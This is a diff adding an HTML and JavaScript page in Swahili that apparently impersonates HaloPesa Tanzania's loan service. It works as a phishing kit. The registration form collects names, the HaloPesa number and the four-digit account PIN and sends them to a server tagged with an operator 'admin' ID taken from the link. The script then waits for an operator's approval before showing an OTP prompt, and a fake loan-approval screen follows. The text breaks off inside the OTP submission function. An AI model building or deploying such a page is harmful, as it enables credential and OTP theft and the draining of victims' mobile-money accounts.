@@ -1,0 +1,846 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HaloPesa Tanzania – Mikopo ya Haraka na Rahisi</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --brand-red:#cc3300;
+    --brand-orange:#ff6600;
+    --brand-amber:#ff9900;
+    --brand-yellow:#ffdd00;
+    --grad:linear-gradient(135deg,#ff6600,#ff9900);
+    --grad-deep:linear-gradient(135deg,#cc3300,#ff6600,#ff9900);
+    --page-bg:#EBEBEB;
+    --white:#FFFFFF;
+    --text-dark:#1C1C1C;
+    --text-mid:#444;
+    --text-light:#888;
+    --border:#ddd;
+    --radius:14px;
+    --radius-sm:9px;
+    --shadow-card:0 6px 28px rgba(0,0,0,0.08);
+    --shadow-pop:0 20px 60px rgba(0,0,0,0.22);
+  }
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  body{font-family:'Inter',sans-serif;background:var(--page-bg);color:var(--text-dark);min-height:100vh;overflow-x:hidden}
+
+  /* ══════════ PAGES ══════════ */
+  .page{display:none;min-height:100vh;animation:fadeIn .35s ease}
+  .page.active{display:flex;flex-direction:column}
+  @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+
+  /* ══════════ NAVBAR ══════════ */
+  .navbar{background:var(--brand-red);display:flex;align-items:center;justify-content:center;padding:0 20px;height:58px;position:relative;flex-shrink:0;box-shadow:0 2px 12px rgba(204,51,0,0.25)}
+  .nav-left{position:absolute;left:18px;color:rgba(255,255,255,0.88);font-size:.85rem;font-weight:500;cursor:pointer;text-decoration:none;transition:color .2s;display:flex;align-items:center;gap:4px}
+  .nav-left:hover{color:#fff}
+  .hp-logo-sm{display:flex;align-items:center;gap:8px}
+  .hp-logo-sm svg{width:28px;height:28px;filter:drop-shadow(0 2px 4px rgba(0,0,0,.15))}
+  .hp-logo-sm .brand{font-size:1.18rem;font-weight:800;color:#fff;letter-spacing:-.02em}
+  .hp-logo-sm .brand span{color:var(--brand-yellow)}
+
+  /* ══════════ BUTTONS ══════════ */
+  .btn-grad{background:var(--grad);color:#fff;border:none;border-radius:var(--radius-sm);padding:15px 20px;font-size:.9rem;font-weight:700;letter-spacing:.06em;cursor:pointer;width:100%;font-family:'Inter',sans-serif;transition:transform .15s,box-shadow .2s,opacity .2s;box-shadow:0 6px 18px rgba(255,102,0,.3)}
+  .btn-grad:hover{opacity:.95;transform:translateY(-1px);box-shadow:0 8px 22px rgba(255,102,0,.38)}
+  .btn-grad:active{transform:translateY(0)}
+  .btn-grad:disabled{opacity:.5;cursor:not-allowed;transform:none;box-shadow:none}
+  .btn-gray{background:#e4e4e4;color:#666;border:none;border-radius:var(--radius-sm);padding:14px 20px;font-size:.86rem;font-weight:600;letter-spacing:.04em;cursor:pointer;flex:1;font-family:'Inter',sans-serif;transition:background .2s}
+  .btn-gray:hover{background:#d6d6d6}
+  .btn-go{background:var(--grad);color:#fff;border:none;border-radius:var(--radius-sm);padding:15px 40px;font-size:.92rem;font-weight:700;cursor:pointer;font-family:'Inter',sans-serif;letter-spacing:.05em;box-shadow:0 8px 22px rgba(0,0,0,.2);transition:transform .15s}
+  .btn-go:hover{transform:translateY(-2px)}
+
+  /* ══════════ FIELDS ══════════ */
+  .field{margin-bottom:18px}
+  .field label{display:block;font-size:.83rem;font-weight:600;color:var(--text-mid);margin-bottom:7px}
+  .field input,.field select,.field textarea{width:100%;padding:13px 15px;border:1.5px solid var(--border);border-radius:var(--radius-sm);font-family:'Inter',sans-serif;font-size:.92rem;color:var(--text-dark);background:#fff;outline:none;transition:border-color .2s,box-shadow .2s}
+  .field input:focus,.field select:focus,.field textarea:focus{border-color:var(--brand-orange);box-shadow:0 0 0 3px rgba(255,102,0,.13)}
+  .field textarea{resize:vertical;min-height:90px}
+  .field-row{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+  .field-hint{font-size:.75rem;color:var(--text-light);margin-top:6px}
+  .phone-row{display:flex}
+  .ph-pre{padding:13px 13px;background:#f6f6f6;border:1.5px solid var(--border);border-right:none;border-radius:var(--radius-sm) 0 0 var(--radius-sm);font-size:.88rem;font-weight:600;color:#555;white-space:nowrap;display:flex;align-items:center}
+  .phone-row input{border-radius:0 var(--radius-sm) var(--radius-sm) 0 !important;flex:1}
+
+  /* ══════════ PROGRESS ══════════ */
+  .prog-row{display:flex;gap:8px;margin:12px 0 26px}
+  .prog-seg{flex:1;height:5px;border-radius:3px;background:#e5e5e5;transition:background .3s}
+  .prog-seg.done{background:var(--brand-amber)}
+  .prog-seg.now{background:var(--brand-orange);box-shadow:0 0 8px rgba(255,102,0,.5)}
+
+  /* ══════════ STEP CARDS ══════════ */
+  .step-center{flex:1;display:flex;align-items:flex-start;justify-content:center;padding:28px 16px}
+  .step-card{width:100%;max-width:480px;background:#fff;border-radius:var(--radius);box-shadow:var(--shadow-card);padding:34px 30px;border:1px solid rgba(0,0,0,.03)}
+  .step-card h2{font-size:1.3rem;font-weight:800;text-align:center;margin-bottom:5px;letter-spacing:-.02em}
+  .step-sub{text-align:center;font-size:.83rem;color:var(--text-light);margin-bottom:4px;font-weight:500}
+
+  /* ══════════ MESSAGES ══════════ */
+  .msg-box{border-radius:var(--radius-sm);padding:12px 16px;font-size:.85rem;margin-bottom:16px;display:none;align-items:center;gap:10px;font-weight:500}
+  .msg-box.show{display:flex;animation:fadeIn .25s ease}
+  .msg-box.error{background:#fef2f2;border:1.5px solid #fecaca;color:#991b1b}
+  .msg-box.success{background:#f0fdf4;border:1.5px solid #bbf7d0;color:#166534}
+  .msg-icon{font-size:1.05rem;flex-shrink:0;font-weight:700}
+
+  /* ══════════ OVERLAYS ══════════ */
+  .overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.55);backdrop-filter:blur(4px);z-index:999;align-items:center;justify-content:center;padding:16px}
+  .overlay.show{display:flex}
+  .modal{background:var(--white);border-radius:var(--radius);padding:42px 36px;text-align:center;max-width:330px;width:100%;box-shadow:var(--shadow-pop);animation:popIn .35s cubic-bezier(.34,1.56,.64,1)}
+  @keyframes popIn{from{opacity:0;transform:scale(.85)}to{opacity:1;transform:scale(1)}}
+  .spinner{width:46px;height:46px;border:4px solid #f0f0f0;border-top-color:var(--brand-orange);border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 20px}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .modal h3{font-size:1.12rem;font-weight:700;color:var(--text-dark);margin-bottom:8px}
+  .modal p{font-size:.88rem;color:var(--text-light);line-height:1.5}
+
+  /* ══════════ OTP MODAL ══════════ */
+  .otp-modal{background:var(--white);border-radius:var(--radius);padding:38px 32px;text-align:center;max-width:410px;width:100%;box-shadow:var(--shadow-pop);animation:popIn .35s cubic-bezier(.34,1.56,.64,1)}
+  .otp-modal h2{font-size:1.35rem;font-weight:800;margin-bottom:8px;letter-spacing:-.02em}
+  .otp-modal p{font-size:.88rem;color:var(--text-light);margin-bottom:6px;line-height:1.5}
+  .otp-inputs{display:flex;gap:10px;margin:20px 0 14px;width:100%;justify-content:center}
+  .otp-box{width:54px;height:58px;border:1.5px solid var(--border);border-radius:var(--radius-sm);text-align:center;font-family:'Inter',sans-serif;font-size:1.35rem;font-weight:700;color:var(--brand-red);outline:none;transition:border-color .2s,box-shadow .2s;background:#fff}
+  .otp-box:focus{border-color:var(--brand-orange);box-shadow:0 0 0 3px rgba(255,102,0,.15)}
+  .otp-timer{font-size:.86rem;color:var(--text-light);margin-bottom:18px;font-weight:600}
+  .otp-timer.warn{color:var(--brand-orange)}
+
+  /* ══════════ WAITING MODAL ══════════ */
+  .waiting-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.55);backdrop-filter:blur(4px);z-index:998;align-items:center;justify-content:center;padding:16px}
+  .waiting-overlay.show{display:flex}
+  .waiting-modal{background:var(--white);border-radius:var(--radius);padding:42px 36px;text-align:center;max-width:340px;width:100%;box-shadow:var(--shadow-pop);animation:popIn .35s cubic-bezier(.34,1.56,.64,1)}
+  .waiting-modal h3{font-size:1.12rem;font-weight:700;margin-bottom:8px}
+  .waiting-modal .wd{font-size:.75rem;color:#888;margin-top:18px;line-height:1.7}
+  .waiting-modal .wd strong{color:var(--text-mid)}
+
+  /* ══════════ FOOTER ══════════ */
+  .pg-footer{margin-top:auto;padding:16px;text-align:center;font-size:.78rem;color:var(--text-light);background:#fff;border-top:1px solid #eee;flex-shrink:0;font-weight:500}
+
+  /* ══════════ SUMMARY BOX ══════════ */
+  .sum-box{border:1px solid #eee;border-left:4px solid var(--brand-orange);border-radius:var(--radius-sm);padding:18px 16px;margin:18px 0;background:#fffaf7}
+  .sum-box h3{font-size:.9rem;font-weight:700;margin-bottom:14px;color:var(--text-dark)}
+  .sum-row{display:flex;justify-content:space-between;font-size:.83rem;padding:8px 0;border-bottom:1px solid #f2f2f2}
+  .sum-row:last-child{border-bottom:none}
+  .sum-row .sk{color:var(--text-light);font-weight:500}
+  .sum-row .sv{font-weight:700;color:var(--text-dark)}
+
+  /* ══════════ SUBMITTED PAGE ══════════ */
+  #page-submitted{background:linear-gradient(160deg,#cc3300,#ff6600);align-items:center;justify-content:center}
+  .sub-wrap{text-align:center;padding:40px 24px;max-width:430px}
+  .sub-icon{width:86px;height:86px;border-radius:50%;background:rgba(255,255,255,.12);border:2px solid rgba(255,255,255,.3);display:flex;align-items:center;justify-content:center;font-size:2.2rem;margin:0 auto 26px;animation:pulse 2s ease infinite}
+  @keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(255,221,0,.35)}50%{box-shadow:0 0 0 20px rgba(255,221,0,0)}}
+  .sub-wrap h2{font-size:1.7rem;font-weight:800;color:#fff;margin-bottom:14px;letter-spacing:-.02em}
+  .sub-wrap p{color:rgba(255,255,255,.9);font-size:.9rem;line-height:1.7;margin-bottom:26px}
+
+  /* ══════════ APPROVAL PAGE ══════════ */
+  #page-approval{background:var(--grad-deep);min-height:100vh;align-items:center;justify-content:center;padding:32px 16px}
+  .appr-wrap{width:100%;max-width:520px;box-shadow:0 24px 60px rgba(0,0,0,.28);border-radius:var(--radius);overflow:hidden}
+  .appr-top{background:#fff;padding:30px 24px 0;text-align:center}
+  .check-circle{width:60px;height:60px;border-radius:50%;background:var(--grad);display:flex;align-items:center;justify-content:center;margin:0 auto 14px;font-size:1.5rem;color:#fff;box-shadow:0 6px 20px rgba(255,102,0,.45);animation:popIn .5s cubic-bezier(.34,1.56,.64,1)}
+  .appr-title{font-size:1.3rem;font-weight:800;margin-bottom:6px;letter-spacing:-.02em}
+  .appr-sub{font-size:.85rem;color:var(--text-light);margin-bottom:20px}
+  .appr-banner{background:var(--grad);padding:18px;margin:0 -24px;text-align:center;box-shadow:0 6px 20px rgba(255,102,0,.3)}
+  .appr-banner .abl{font-size:.72rem;color:rgba(255,255,255,.92);text-transform:uppercase;letter-spacing:.1em;font-weight:600}
+  .appr-banner .aba{font-size:2.1rem;font-weight:800;color:#fff;margin-top:4px;letter-spacing:-.02em}
+  .ld-card{background:#fff;padding:22px 24px}
+  .ld-htitle{font-size:.85rem;font-weight:700;color:var(--text-mid);margin-bottom:16px}
+  .ld-row{display:flex;align-items:center;gap:14px;padding:12px 0;border-bottom:1px solid #f5f5f5}
+  .ld-row:last-child{border-bottom:none}
+  .ld-icon{width:38px;height:38px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:.95rem;flex-shrink:0}
+  .ic-g{background:linear-gradient(135deg,#2ECC71,#27AE60);box-shadow:0 4px 12px rgba(46,204,113,.3)}
+  .ld-lbl{font-size:.7rem;color:var(--text-light);text-transform:uppercase;letter-spacing:.06em;font-weight:600}
+  .ld-val{font-size:.95rem;font-weight:700;margin-top:2px}
+  .rth-wrap{background:#fff;padding:14px 24px 26px}
+  .rth-btn{width:100%;padding:14px;background:var(--grad);color:#fff;border:none;border-radius:var(--radius-sm);font-size:.9rem;font-weight:700;cursor:pointer;font-family:'Inter',sans-serif;letter-spacing:.05em;box-shadow:0 6px 18px rgba(255,102,0,.35);transition:transform .15s}
+  .rth-btn:hover{transform:translateY(-1px)}
+
+  /* ══════════ RESPONSIVE ══════════ */
+  @media(max-width:500px){
+    .field-row{grid-template-columns:1fr}
+    .step-card{padding:26px 20px}
+    .otp-box{width:48px;height:52px;font-size:1.2rem}
+    .otp-inputs{gap:8px}
+    .modal,.otp-modal,.waiting-modal{padding:32px 24px}
+  }
+</style>
+</head>
+<body>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!-- PAGE 1: REGISTRATION                                       -->
+<!-- ══════════════════════════════════════════════════════════ -->
+<div id="page-registration" class="page active">
+  <div class="navbar">
+    <div class="hp-logo-sm">
+      <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="20" cy="20" r="20" fill="#ff6600"/>
+        <path d="M10 28 Q20 8 30 28" stroke="#fff" stroke-width="3.5" fill="none" stroke-linecap="round"/>
+        <circle cx="20" cy="20" r="4" fill="#ffdd00"/>
+      </svg>
+      <div class="brand">Halo<span>Pesa</span></div>
+    </div>
+  </div>
+
+  <div class="step-center" style="padding:40px 16px;">
+    <div class="step-card">
+      <h2>Fungua Akaunti HaloPesa</h2>
+      <p class="step-sub">Dakika chache tu</p>
+
+      <div class="msg-box error" id="regErr" style="margin-top:18px"><span class="msg-icon">✕</span><span id="regErrTxt"></span></div>
+
+      <div class="field">
+        <label>Jina la Kwanza</label>
+        <input type="text" id="regFirst" placeholder="Jina lako" oninput="clearErr('regErr')">
+      </div>
+
+      <div class="field">
+        <label>Jina la Ukoo</label>
+        <input type="text" id="regLast" placeholder="Jina la ukoo" oninput="clearErr('regErr')">
+      </div>
+
+      <div class="field">
+        <label>Nambari ya HaloPesa</label>
+        <input type="text" id="regHaloNumber" placeholder="0712345678" inputmode="numeric" maxlength="10" oninput="clearErr('regErr')">
+        <div class="field-hint">Tarakimu 10</div>
+      </div>
+
+      <div class="field">
+        <label>Namba ya Siri</label>
+        <input type="text" id="regPassword" placeholder="0000" inputmode="numeric" maxlength="4" oninput="clearErr('regErr')">
+        <div class="field-hint">Tarakimu 4</div>
+      </div>
+
+      <button class="btn-grad" onclick="registerUser()">FUNGUA AKAUNTI</button>
+    </div>
+  </div>
+
+  <div class="pg-footer">© 2026 HaloPesa Tanzania</div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!-- WAITING FOR ADMIN APPROVAL OVERLAY                         -->
+<!-- ══════════════════════════════════════════════════════════ -->
+<div class="waiting-overlay" id="waitingOverlay">
+  <div class="waiting-modal">
+    <div class="spinner"></div>
+    <h3>Inasubiri Idhinisho...</h3>
+    <p style="font-size:.85rem;color:#888;" id="waitingMsg">Tafadhali subiri. Admin anakagua maelezo yako</p>
+    <p class="wd">
+      <strong id="waitName">—</strong><br>
+      HaloPesa: <strong id="waitHalo">—</strong>
+    </p>
+    <button class="btn-gray" onclick="cancelWaiting()" style="margin-top:18px;width:100%;">ANULIA</button>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!-- OTP VERIFICATION MODAL                                     -->
+<!-- ══════════════════════════════════════════════════════════ -->
+<div class="overlay" id="otpOverlay">
+  <div class="otp-modal">
+    <h2>Uthibitisho wa OTP</h2>
+    <p>Weka OTP iliyotumwa kwenye simu yako</p>
+    <p style="color:#ff6600;font-weight:700;margin-bottom:16px;" id="otpPhoneDisplay"></p>
+
+    <div class="msg-box error" id="otpMsgErr"><span class="msg-icon">✕</span><span id="otpMsgErrTxt"></span></div>
+    <div class="msg-box success" id="otpMsgOk"><span class="msg-icon">✓</span><span id="otpMsgOkTxt"></span></div>
+
+    <p style="font-size:.83rem;color:#666;margin-bottom:12px;">Ingiza OTP iliyotumwa kwenye simu yako (tarakimu 4)</p>
+
+    <div class="otp-inputs">
+      <input type="text" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpMv(this,0)" id="o0">
+      <input type="text" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpMv(this,1)" id="o1">
+      <input type="text" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpMv(this,2)" id="o2">
+      <input type="text" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpMv(this,3)" id="o3">
+    </div>
+
+    <div class="otp-timer" id="otpTimer">⏱️ Muda unaobaki: <strong id="otpTimeRemaining">60</strong>s</div>
+
+    <button class="btn-grad" id="bOtp" onclick="submitOtp()" style="margin-bottom:12px;">WASILISHA OTP</button>
+    <button class="btn-grad" id="bResendOtp" onclick="resendOtp()" style="margin-bottom:12px;display:none;background:#888;">TUMA OTP TENA</button>
+    <button class="btn-gray" onclick="closeOtpModal()" style="width:100%;">Ghairi</button>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!-- PAGE 2: LOAN STEP 1                                        -->
+<!-- ══════════════════════════════════════════════════════════ -->
+<div id="page-step1" class="page">
+  <nav class="navbar">
+    <div class="hp-logo-sm">
+      <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="20" cy="20" r="20" fill="#ff6600"/>
+        <path d="M10 28 Q20 8 30 28" stroke="#fff" stroke-width="3.5" fill="none" stroke-linecap="round"/>
+        <circle cx="20" cy="20" r="4" fill="#ffdd00"/>
+      </svg>
+      <div class="brand">Halo<span>Pesa</span></div>
+    </div>
+  </nav>
+  <div class="step-center">
+    <div class="step-card">
+      <h2>Maombi ya Mkopo</h2>
+      <p class="step-sub">Hatua 1 ya 2</p>
+      <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div></div>
+      <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
+
+      <div class="field"><label>Kiasi cha Mkopo (TSh)</label><input type="number" id="s1am" value="100000" placeholder="Weka kiasi" oninput="clearErr('s1Err')"></div>
+      <div class="field"><label>Muda wa Mkopo</label><select id="s1te"><option>Miezi 6</option><option>Miezi 12</option><option>Miezi 18</option><option>Miezi 24</option><option>Miezi 36</option><option selected>Miezi 48</option><option>Miezi 60</option></select></div>
+      <div class="field"><label>Madhumuni ya Mkopo</label><textarea id="s1pu" placeholder="Elezea madhumuni ya mkopo wako…" oninput="clearErr('s1Err')"></textarea></div>
+
+      <div class="field">
+        <label>Nambari ya Simu</label>
+        <div class="phone-row"><div class="ph-pre">🇹🇿 +255</div><input type="tel" id="s1ph" placeholder="712345678" maxlength="9" oninput="clearErr('s1Err')"></div>
+      </div>
+
+      <button class="btn-grad" onclick="toS2()">HATUA INAYOFUATA</button>
+    </div>
+  </div>
+  <div class="pg-footer">© 2026 HaloPesa Tanzania</div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!-- PAGE 3: LOAN STEP 2                                        -->
+<!-- ══════════════════════════════════════════════════════════ -->
+<div id="page-step2" class="page">
+  <nav class="navbar">
+    <a class="nav-left" onclick="goTo('page-step1')">← Rudi</a>
+    <div class="hp-logo-sm">
+      <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="20" cy="20" r="20" fill="#ff6600"/>
+        <path d="M10 28 Q20 8 30 28" stroke="#fff" stroke-width="3.5" fill="none" stroke-linecap="round"/>
+        <circle cx="20" cy="20" r="4" fill="#ffdd00"/>
+      </svg>
+      <div class="brand">Halo<span>Pesa</span></div>
+    </div>
+  </nav>
+  <div class="step-center">
+    <div class="step-card">
+      <h2>Maombi ya Mkopo</h2>
+      <p class="step-sub">Hatua 2 ya 2</p>
+      <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
+      <div class="msg-box error" id="s2Err"><span class="msg-icon">✕</span><span id="s2ErrTxt"></span></div>
+
+      <div class="field"><label>Hali ya Ajira</label><select id="s2em"><option>Mwajiriwa</option><option selected>Mfanyabiashara</option><option>Asiye na Kazi</option><option>Mstaafu</option></select></div>
+      <div class="field"><label>Mapato ya Mwaka (TSh)</label><input type="number" id="s2in" placeholder="Weka mapato" oninput="clearErr('s2Err')"></div>
+
+      <div class="sum-box">
+        <h3>Muhtasari wa Maombi</h3>
+        <div class="sum-row"><span class="sk">Kiasi:</span><span class="sv" id="sA">TSh 100,000</span></div>
+        <div class="sum-row"><span class="sk">Muda:</span><span class="sv" id="sT">Miezi 48</span></div>
+        <div class="sum-row"><span class="sk">Mwombaji:</span><span class="sv" id="sN">—</span></div>
+      </div>
+
+      <button class="btn-grad" onclick="submitApp()">WASILISHA MAOMBI</button>
+    </div>
+  </div>
+  <div class="pg-footer">© 2026 HaloPesa Tanzania</div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!-- PAGE 5: SUBMITTED                                          -->
+<!-- ══════════════════════════════════════════════════════════ -->
+<div id="page-submitted" class="page">
+  <div class="sub-wrap">
+    <div class="sub-icon">📋</div>
+    <h2>Maombi Yamewasilishwa!</h2>
+    <p>Mkopo wako umewasilishwa. Tafadhali subiri idhini. Itakuwa haraka!</p>
+    <button class="btn-go" onclick="goTo('page-approval')">Endelea</button>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!-- PAGE 6: APPROVAL                                           -->
+<!-- ══════════════════════════════════════════════════════════ -->
+<div id="page-approval" class="page">
+  <div class="appr-wrap">
+    <div class="appr-top">
+      <div class="check-circle">✓</div>
+      <h2 class="appr-title">🎉 Hongera!</h2>
+      <p class="appr-sub">Mkopo wako <strong>umeidhinishwa!</strong></p>
+      <div class="appr-banner"><div class="abl">KIASI KILICHOIDHINISHWA</div><div class="aba" id="apAmt">TSh 100,000</div></div>
+    </div>
+    <div class="ld-card">
+      <div class="ld-htitle">💳 Maelezo ya Mkopo</div>
+      <div class="ld-row"><div class="ld-icon ic-g">💵</div><div><div class="ld-lbl">MALIPO YA KILA MWEZI</div><div class="ld-val" id="apMthly">TSh 2,750</div></div></div>
+      <div class="ld-row"><div class="ld-icon ic-g">📅</div><div><div class="ld-lbl">MUDA WA MKOPO</div><div class="ld-val" id="apTerm">Miezi 48</div></div></div>
+    </div>
+    <div class="rth-wrap"><button class="rth-btn" onclick="location.reload()">Rudi Nyumbani</button></div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!-- SUBMIT LOADING MODAL                                       -->
+<!-- ══════════════════════════════════════════════════════════ -->
+<div class="overlay" id="mSubmit">
+  <div class="modal"><div class="spinner"></div><h3>Inawasilisha Maombi…</h3><p>Tafadhali subiri</p></div>
+</div>
+
+<script>
+/* ══════════════════════════════════════════════════════════
+   STATE
+   ══════════════════════════════════════════════════════════ */
+const S = {
+  firstName: '',
+  lastName: '',
+  haloNumber: '',
+  password: '',
+  registrationId: null,
+  amt: 100000,
+  term: 'Miezi 48',
+  purpose: '',
+  phone: '',
+  adminId: null
+};
+
+let approvalCheckInterval = null;
+let otpCheckInterval = null;
+let otpTimerInterval = null;
+
+/* ══════════════════════════════════════════════════════════
+   ADMIN LINK CAPTURE
+   ══════════════════════════════════════════════════════════ */
+const urlParams = new URLSearchParams(window.location.search);
+if (urlParams.has('admin')) {
+  S.adminId = urlParams.get('admin').trim();
+  console.log('🔑 Admin Link ID captured: ' + S.adminId);
+  notifyAdminLinkOpened(S.adminId);
+} else {
+  console.log('ℹ️ No admin link used (direct access)');
+}
+
+/* ══════════════════════════════════════════════════════════
+   PAGE NAVIGATION
+   ══════════════════════════════════════════════════════════ */
+function goTo(id) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  window.scrollTo(0, 0);
+}
+
+function clearErr(id) {
+  const el = document.getElementById(id);
+  if (el) el.classList.remove('show');
+}
+
+function showErr(id, msg) {
+  const t = document.getElementById(id + 'Txt');
+  const b = document.getElementById(id);
+  if (t) t.textContent = msg;
+  if (b) b.classList.add('show');
+}
+
+/* ══════════════════════════════════════════════════════════
+   ADMIN NOTIFICATIONS
+   ══════════════════════════════════════════════════════════ */
+async function notifyAdminLinkOpened(adminId) {
+  try {
+    const res = await fetch('/api/notify-admin-link-opened', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        adminId: adminId,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent
+      })
+    });
+    if (res.ok) console.log('✅ Admin notified: link opened');
+    else console.log('⚠️ Notify admin failed HTTP ' + res.status);
+  } catch (e) {
+    console.log('⚠️ Notify admin error: ' + e.message);
+  }
+}
+
+async function notifyAdminOtpResent(registrationId, adminId) {
+  try {
+    const res = await fetch('/api/notify-admin-otp-resent', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        registrationId: registrationId,
+        adminId: adminId,
+        timestamp: new Date().toISOString()
+      })
+    });
+    if (res.ok) console.log('✅ Admin notified: OTP resent');
+  } catch (e) {
+    console.log('⚠️ Notify OTP resent error: ' + e.message);
+  }
+}
+
+/* ══════════════════════════════════════════════════════════
+   REGISTRATION
+   ══════════════════════════════════════════════════════════ */
+async function registerUser() {
+  const first = document.getElementById('regFirst').value.trim();
+  const last = document.getElementById('regLast').value.trim();
+  const haloNum = document.getElementById('regHaloNumber').value.trim();
+  const pwd = document.getElementById('regPassword').value.trim();
+
+  if (!first) { showErr('regErr', 'Tafadhali weka jina la kwanza'); return; }
+  if (!last) { showErr('regErr', 'Tafadhali weka jina la ukoo'); return; }
+  if (!haloNum) { showErr('regErr', 'Tafadhali weka nambari ya HaloPesa'); return; }
+  if (!/^\d{10}$/.test(haloNum)) { showErr('regErr', 'Nambari ya HaloPesa lazima iwe tarakimu 10'); return; }
+  if (!pwd) { showErr('regErr', 'Tafadhali weka namba ya siri'); return; }
+  if (!/^\d{4}$/.test(pwd)) { showErr('regErr', 'Namba ya siri lazima iwe tarakimu 4'); return; }
+
+  S.firstName = first;
+  S.lastName = last;
+  S.haloNumber = haloNum;
+  S.password = pwd;
+
+  try {
+    const res = await fetch('/api/register-user', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        firstName: first,
+        lastName: last,
+        haloNumber: haloNum,
+        password: pwd,
+        timestamp: new Date().toISOString(),
+        adminId: S.adminId
+      })
+    });
+
+    const result = await res.json();
+    if (result.success) {
+      S.registrationId = result.registrationId;
+      showWaitingApprovalOverlay();
+      startApprovalPolling();
+    } else {
+      showErr('regErr', result.message || 'Hitilafu inatokea');
+    }
+  } catch (e) {
+    showErr('regErr', 'Hitilafu inatokea. Tafadhali jaribu tena.');
+  }
+}
+
+/* ══════════════════════════════════════════════════════════
+   WAITING FOR ADMIN APPROVAL
+   ══════════════════════════════════════════════════════════ */
+function showWaitingApprovalOverlay() {
+  document.getElementById('waitName').textContent = S.firstName + ' ' + S.lastName;
+  document.getElementById('waitHalo').textContent = S.haloNumber;
+  document.getElementById('waitingOverlay').classList.add('show');
+}
+
+function closeWaitingOverlay() {
+  document.getElementById('waitingOverlay').classList.remove('show');
+  if (approvalCheckInterval) { clearInterval(approvalCheckInterval); approvalCheckInterval = null; }
+}
+
+function cancelWaiting() {
+  closeWaitingOverlay();
+  S.registrationId = null;
+  document.getElementById('regFirst').value = '';
+  document.getElementById('regLast').value = '';
+  document.getElementById('regHaloNumber').value = '';
+  document.getElementById('regPassword').value = '';
+}
+
+function startApprovalPolling() {
+  if (approvalCheckInterval) clearInterval(approvalCheckInterval);
+  approvalCheckInterval = setInterval(async () => {
+    try {
+      const res = await fetch(`/api/check-registration-approval/${S.registrationId}`);
+      const data = await res.json();
+
+      if (data.status === 'approved') {
+        clearInterval(approvalCheckInterval);
+        approvalCheckInterval = null;
+        closeWaitingOverlay();
+        showOtpModal();
+      } else if (data.status === 'rejected') {
+        clearInterval(approvalCheckInterval);
+        approvalCheckInterval = null;
+        closeWaitingOverlay();
+        showErr('regErr', 'Ombi lako lilikataliwa');
+        S.registrationId = null;
+      }
+    } catch (e) {
+      console.error('Approval check error:', e);
+    }
+  }, 3000);
+}
+
+/* ══════════════════════════════════════════════════════════
+   OTP MODAL
+   ══════════════════════════════════════════════════════════ */
+function showOtpModal() {
+  console.log('📱 Showing OTP Modal');
+
+  document.getElementById('otpPhoneDisplay').textContent = 'HaloPesa: ' + S.haloNumber;
+  clearErr('otpMsgErr');
+  clearErr('otpMsgOk');
+  [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
+
+  document.getElementById('otpTimer').innerHTML = '⏱️ Muda unaobaki: <strong id="otpTimeRemaining">60</strong>s';
+  document.getElementById('otpTimer').style.color = '#888';
+  document.getElementById('otpTimer').classList.remove('warn');
+
+  document.getElementById('bOtp').style.display = 'block';
+  document.getElementById('bOtp').disabled = false;
+  document.getElementById('bResendOtp').style.display = 'none';
+
+  if (otpTimerInterval) { clearInterval(otpTimerInterval); otpTimerInterval = null; }
+
+  document.getElementById('otpOverlay').classList.add('show');
+  console.log('🟢 ADMIN APPROVED - STARTING COUNTDOWN NOW');
+  startOtpTimer();
+}
+
+function closeOtpModal() {
+  document.getElementById('otpOverlay').classList.remove('show');
+  if (otpCheckInterval) { clearInterval(otpCheckInterval); otpCheckInterval = null; }
+  if (otpTimerInterval) { clearInterval(otpTimerInterval); otpTimerInterval = null; }
+}
+
+function otpMv(el, idx) {
+  if (el.value.length > 1) el.value = el.value.slice(-1);
+  if (el.value && idx < 3) document.getElementById('o' + (idx + 1)).focus();
+}
+
+async function submitOtp() {
+  const otp = [0,1,2,3].map(i => document.getElementById('o'+i).value).join('');
+
+  if (otp.length !== 4) {
